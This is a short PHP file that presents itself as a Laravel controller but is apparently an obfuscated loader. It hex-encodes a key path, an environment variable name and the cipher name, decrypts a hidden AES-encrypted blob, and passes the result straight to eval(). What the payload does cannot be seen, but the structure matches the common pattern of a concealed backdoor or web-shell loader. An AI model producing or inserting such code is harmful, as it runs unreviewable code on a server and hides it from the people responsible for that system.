<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('yXbmo57tA9YdsWsdSDJd+g==');

$c=base64_decode(

'vRUMeaCvRZ0pT8k8Qe/v3lHzTD+z/MSlDdNNjGjCUotNbetaM0ywz0BET8tIlBvd1qy0DlViNHEc' .
'TinlIUODw6cBlycBvZNwv1zKotbRGa1Lp4aoRk3XrVPwEzh86n2bFAY0Rxgpb2eyhbtQeLjay2IT' .
'AtORTo2N7VihigF1KBhOJpCFQCpjlt4gdt0pV5bNEgtv748zE1LqYmAR60HyE54Ncxnag16WnxKQ' .
'Y/nJjfT3qnAdcfUy50Kzt3fYAjrd'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

